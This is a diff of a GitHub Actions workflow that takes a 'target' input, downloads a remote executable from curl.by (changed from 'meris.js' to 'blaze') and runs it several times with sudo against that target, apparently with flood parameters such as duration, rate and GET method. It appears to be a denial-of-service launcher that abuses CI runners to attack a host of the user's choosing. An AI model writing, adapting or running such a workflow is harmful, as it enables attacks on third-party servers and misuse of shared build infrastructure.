@@ -23,12 +23,12 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-          wget https://curl.by/W5CU9/meris.js
-          chmod +x meris.js
+          wget https://curl.by/qJRMW/blaze
+          chmod +x blaze
           
           PIDS=()
-          for i in {1..96}; do
-            sudo timeout 250 node meris.js "$TARGET" 250 
+          for i in {1..8}; do
+            sudo timeout 100 ./blaze "$TARGET" 100 40 40 GET
             PIDS+=($!)
           done
 
@@ -38,5 +38,5 @@ jobs:
 
       - name: Finish !
         run: |
-          sleep 10
+          sleep 30
           exit 0
